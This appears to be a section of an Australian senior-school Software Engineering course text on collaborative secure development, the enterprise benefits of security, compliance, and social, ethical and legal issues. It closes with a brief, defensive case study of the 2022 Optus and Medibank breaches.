Collaborative security practices — particularly peer code review and pair programming — tend to produce higher quality, more secure code than individual development. Peer code review is widely regarded as one of the most cost-effective ways to find defects: catching a vulnerability during code review costs a fraction of fixing it after deployment. When two developers review each other's security-critical code, logical errors, missing edge case handling, and subtle vulnerability patterns that the original author's familiarity blinds them to are caught before they ship. Collaboration also produces better documentation of security decisions — why a particular implementation was chosen over alternatives — reducing the risk that future maintainers unknowingly introduce vulnerabilities by changing security controls they do not understand the purpose of. Teams that practise collaborative security review tend to have fewer critical vulnerabilities reach production.

Collaborative practices that improve the solution

  • Peer review through pull requests. A second person reads every change before it is merged, using a checklist (see the code review checklist in the strategies section). Requiring an approval before merging security-critical code makes review a rule, not a favour.
  • Pair programming. Two people work at one screen. The "navigator" watches for mistakes as the "driver" types, which catches flaws at the moment they are written.
  • Security champions. One developer in each team gets extra security training and acts as the first point of contact, spreading knowledge without needing a large security department.
  • Blameless post-incident reviews. After a failure the team asks what in the process allowed it, not who to blame. People then report problems early instead of hiding them.
  • Shared documentation. Threat models, decision logs and the process diary record why a control exists, so later maintainers do not remove it.
  • Coordinated disclosure. Outsiders who find a flaw need a clear way to report it privately. Many organisations publish a security contact so that a researcher's report reaches the team, and the flaw is fixed before it is made public.

Challenges. Collaboration is not free. Reviews take time, teams can disagree about how much risk is acceptable, and "everyone owns security" can turn into "no-one owns security" unless roles are explicit. Good teams agree who decides, write it down and keep review comments about the code, not the person.

Benefits to an Enterprise

🎯 (SE-12-01, SE-12-05)

📌 Investigate and explain the benefits to an enterprise of the implementation of safe and secure development practices

  • improved products or services
  • influence on future software development
  • improved work practices
  • productivity
  • business interactivity

Improved Products or Services

Software built with security embedded from the design phase is fundamentally more reliable and trustworthy than software that has security patched on reactively. Secure products experience fewer incidents — zero outages from ransomware, no emergency patches that break existing functionality, no data breach disclosures that destroy user trust. This reliability becomes a genuine product differentiator: enterprise customers conducting vendor due diligence explicitly assess security posture (often requiring SOC 2 Type II certification or ISO 27001 compliance) before signing contracts. A demonstrably secure product wins those procurement decisions. For consumer products, trust built over years of responsible data stewardship creates brand loyalty that is enormously difficult for competitors to erode — while a single major breach can permanently destroy it.

Influence on Future Software Development

Enterprises that develop a culture of secure software engineering accumulate codified security knowledge — documented threat models, established security patterns, reusable security libraries, and tested compliance frameworks — that directly accelerates and improves the security of every subsequent product. The first product built with security by design takes significant investment to establish the patterns; the second product is built on top of proven, battle-tested security infrastructure. Over time, the enterprise develops internal expertise and reputation that attracts security-conscious talent and positions the organisation to participate in industry standards development (e.g., contributing to OWASP, Australian Cyber Security Centre guidance, or NIST frameworks), further enhancing reputation and influence. Security-mature organisations are also better positioned to respond to and shape evolving regulatory requirements — rather than scrambling to comply at the last moment.

Improved Work Practices

The implementation of DevSecOps — integrating security into every stage of the development pipeline — transforms security from a gating checkpoint at the end of the development cycle into a continuous quality feedback mechanism throughout it. Automated SAST scanning in CI/CD pipelines means developers receive security feedback within minutes of committing code, while the context of what they wrote is still fresh in mind — making remediation fast and educational. Security champions programs embed security expertise within development teams rather than siloing it in a separate security department, improving security knowledge across the entire engineering organisation. These practices systematically reduce the volume of security debt accumulated over time, resulting in a healthier, more maintainable codebase that is faster and cheaper to extend.

Productivity

Counter-intuitively, building security in from the start improves long-term development productivity. The cost of fixing a security vulnerability generally rises at each later stage of development: a vulnerability identified by a developer during coding takes minutes to fix; the same vulnerability caught in code review takes hours; caught in testing takes days (including regression testing); caught in production requires an emergency patch, incident response, possible customer notification, regulatory reporting, and forensic investigation — potentially weeks of disrupted work. Teams that invest in shift-left security (catching vulnerabilities earlier in the development cycle) spend a fraction of the total time on security compared to teams that rely on reactive patching. Also, a stable, low-incident production environment means developers spend time building new features rather than responding to security emergencies.

Business Interactivity

Modern enterprises operate through an ecosystem of interconnected systems — sharing data with partners, customers, suppliers, and regulators through APIs and integrations. Secure API design (with authentication, authorisation scopes, input validation, rate limiting, and encryption) enables this business interactivity without exposing corporate systems to the security risks inherent in external connections. An enterprise with a strong security posture can participate in data-sharing partnerships that competitors with weaker security practices are excluded from — particularly in regulated industries such as healthcare (requiring compliance with Australian Digital Health Agency standards), financial services (PCI-DSS, APRA CPS 234), and government contracting (IRAP assessments). Conversely, a publicised breach or regulatory sanction can immediately disqualify an organisation from business-critical partnerships, with devastating commercial consequences.

Compliance, contracts and market access

Security practices increasingly decide which contracts an enterprise can win, and which laws it has to satisfy. Examples an Australian enterprise may face:

  • The Privacy Act 1988 and the NDB scheme for personal information, and the Security of Critical Infrastructure Act 2018 for operators of assets such as electricity, water, health and telecommunications, which adds duties such as risk management programs and cyber incident reporting.
  • APRA Prudential Standard CPS 234, which sets information security requirements for banks, insurers and superannuation funds regulated by APRA.
  • The government's IRAP (Infosec Registered Assessors Program) assessments, used to judge whether cloud services are suitable for government data, and the ASD Essential Eight as a baseline of mitigation strategies.
  • Customer due diligence: large customers often ask suppliers to show independent evidence of their security, such as ISO/IEC 27001 certification, before signing.

Some organisations also find that cyber insurers ask about specific controls (multi-factor authentication, tested backups, patching) before offering cover or setting the price, which gives a financial reason to build them.

Social, Ethical and Legal Issues

🎯 (SE-12-05)

📌 Evaluate the social, ethical and legal issues and ramifications that affect people and enterprises resulting from the development and implementation of safe and secure software

  • employment
  • data security
  • privacy
  • copyright
  • intellectual property
  • digital disruption

Employment

The growing emphasis on software security is creating significant structural shifts in the technology labour market. Demand for cybersecurity professionals is growing rapidly — Government and industry reports have repeatedly identified a shortage of cyber security skills in Australia. This creates strong employment opportunities for software engineers with security specialisations. However, automation of routine security testing (SAST, DAST, vulnerability scanning) is reducing demand for lower-skilled security roles focused on running tools and interpreting standard outputs. The remaining and growing roles require higher-order skills: penetration testers who think creatively like attackers, security architects who design systemic defences, and incident responders who manage complex breaches under pressure. Developers who do not develop security competency risk being disadvantaged as "secure by default" coding practices become a baseline expectation of all engineering roles, not a specialist add-on.

Data Security

Enterprises that handle personal data have both a legal obligation and an ethical duty to protect it. The legal framework in Australia includes the Privacy Act 1988 (Australian Privacy Principles), the Notifiable Data Breaches (NDB) scheme (requiring notification of eligible breaches to the OAIC and affected individuals as soon as practicable once an organisation has reasonable grounds to believe one has occurred), and sector-specific requirements such as the My Health Records Act for healthcare data. The ethical dimension extends beyond legal compliance: collecting more data than necessary, retaining it longer than required, or using it for purposes beyond those disclosed to users at collection represents a breach of user trust even if it is technically legal. Engineers bear professional responsibility for the security of systems they design — a negligently designed system that suffers an avoidable breach causes real harm to real individuals whose financial, medical, or personal information is exposed. The ethical obligation is to apply due diligence in security design proportionate to the sensitivity of the data handled.

Privacy

Privacy is a fundamental human right recognised in Australian law through the Privacy Act 1988 and its APPs. Insecure software that exposes personal information — whether through a breach caused by negligent security design or through deliberately excessive data collection — violates this right with lasting consequences for affected individuals. Exposed personal information enables identity theft, financial fraud, targeted phishing, and in extreme cases stalking and physical harm. The social harm of large-scale breaches (such as the 2022 Optus breach affecting millions of Australians, or the Medibank breach exposing sensitive health records) extends far beyond the immediate financial impact — creating lasting anxiety, distrust of digital services, and disproportionate harm to vulnerable individuals (domestic violence survivors, people with stigmatised health conditions) whose disclosed information can be weaponised against them. Engineers have an ethical obligation to treat privacy as a genuine design priority, not merely a compliance exercise.

Copyright

Software is protected by copyright from the moment it is created, without requiring registration. Copyright protects the specific expression of code (the actual written source code) — not the underlying idea or functionality. Enterprises must ensure they do not incorporate third-party code without the appropriate licence. Using open-source libraries requires understanding and complying with their respective licences: MIT and Apache 2.0 allow use in proprietary software with attribution; GPL-licensed code requires any derivative work to also be open source — a requirement that can force an enterprise to open-source its proprietary codebase if GPL code is incorporated without understanding this obligation. AI-generated code introduces novel copyright questions that are not yet fully resolved in Australian law — the source of training data and the originality of generated output are active areas of legal debate with significant implications for enterprise software development.

Intellectual Property

Proprietary software algorithms, architectures, and business logic represent significant intellectual property (IP) assets that secure software design must protect from theft and unauthorised disclosure. Trade secrets (unpatented technical approaches that derive value from their secrecy) are protected mainly by the equitable action for breach of confidence and by confidentiality clauses in contracts, but only if the enterprise takes reasonable steps to maintain their secrecy — which requires technical security measures (code obfuscation, server-side execution of sensitive logic, access controls, NDAs with employees and contractors) and legal protections. A security breach that exposes proprietary source code, training data for ML models, or unique business algorithms can destroy the commercial value of years of R&D investment. Also, engineers must ensure the software they develop does not unintentionally incorporate competitors' IP through reverse engineering — a legally and ethically fraught practice with significant liability exposure.

Digital Disruption

Highly secure, scalable digital platforms are a primary vehicle of digital disruption — displacing established industries by offering superior trust, convenience, and cost efficiency built on robust technical infrastructure. The disruption is bidirectional: secure fintech platforms (such as Afterpay, Revolut, and digital-only banks) disrupt traditional banking by offering comparable or superior financial services without physical branch infrastructure; conversely, a high-profile security failure by a disruptive digital entrant (such as a cryptocurrency exchange breach) can instantly restore consumer confidence in the incumbent institution it was displacing. For established enterprises, failing to invest in secure digital infrastructure creates vulnerability to disruption by more security-mature competitors — customers increasingly make choices based on perceived trustworthiness of digital platforms. The social dimension of digital disruption includes: geographic communities losing economic activity as digital services replace local businesses; skill displacement as digital processes automate roles that provided employment pathways; and concentration of market power in digital platform operators whose security and privacy practices affect vast user populations with limited alternatives.

Case study: two 2022 breaches, described carefully

Two events show how technical decisions become social, ethical and legal consequences. Only widely documented facts are given here.

  • Optus (September 2022). Personal information of millions of current and former customers was exposed. Public reporting said the data was reached through an internet-facing application programming interface (API) that lacked adequate access control, and that information about former customers was still being held. Design lessons: authorise every API request, minimise data, and delete what is no longer needed.
  • Medibank (October 2022). Medibank said the attacker used stolen credentials. Data on millions of customers, including sensitive health claims information, was later published after a ransom demand was refused. The OAIC has brought civil penalty proceedings in the Federal Court over the incident. Design lessons: protect credentials with multi-factor authentication and monitoring, limit what one account can reach, and plan the response to extortion in advance.

Both events prompted debate about how long organisations should keep personal information, how quickly customers should be told and whether penalties were sufficient. The maximum Privacy Act penalties were increased in late 2022, soon after the Optus breach. Consider the ethical dimension too: people whose health or identity documents were exposed cannot "undo" the exposure, so the harm is long lasting.
